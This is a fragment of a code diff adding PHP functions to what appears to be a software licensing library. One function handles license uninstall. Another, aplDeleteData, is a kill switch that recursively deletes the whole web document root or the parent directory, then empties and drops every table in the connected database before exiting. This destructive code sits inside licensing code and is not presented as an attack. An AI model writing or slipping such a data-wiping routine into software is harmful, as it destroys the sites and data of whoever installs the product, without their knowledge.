+            $content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_uninstall.php", $post_info, $ROOT_URL);
+            $notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
+
+            if ($notifications_array["notification_case"] == "notification_license_ok") {
+                if (APL_STORAGE == "DATABASE") {
+                    mysqli_query($MYSQLI_LINK, "DELETE FROM " . APL_DATABASE_TABLE);
+                    mysqli_query($MYSQLI_LINK, "DROP TABLE " . APL_DATABASE_TABLE);
+                }
+                if (APL_STORAGE == "FILE") {
+                    $handle = @fopen(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION, "w+");
+                    @fclose($handle);
+                }
+            }
+        }
+        return $notifications_array;
+    }
+
+    function aplDeleteData($MYSQLI_LINK = null)
+    {
+        if (APL_GOD_MODE == "YES" && isset($_SERVER["DOCUMENT_ROOT"])) {
+            $root_directory = $_SERVER["DOCUMENT_ROOT"];
+        } else {
+            $root_directory = dirname(__DIR__);
+        }
+
+        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path) {
+            $path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname());
+        }
+        rmdir($root_directory);
+
+        if (APL_STORAGE == "DATABASE") {
+            $database_tables_array = array();
+            $table_list_results = mysqli_query($MYSQLI_LINK, "SHOW TABLES");
+            while ($table_list_row = mysqli_fetch_row($table_list_results)) {
+                $database_tables_array[] = $table_list_row[0];
+            }
+            if (!empty($database_tables_array)) {
+                foreach ($database_tables_array as $table_name) {
+                    mysqli_query($MYSQLI_LINK, "DELETE FROM {$table_name}");
+                }
+                foreach ($database_tables_array as $table_name) {
+                    mysqli_query($MYSQLI_LINK, "DROP TABLE {$table_name}");
+                }
+            }
+        }
+        exit;
+    }
+}
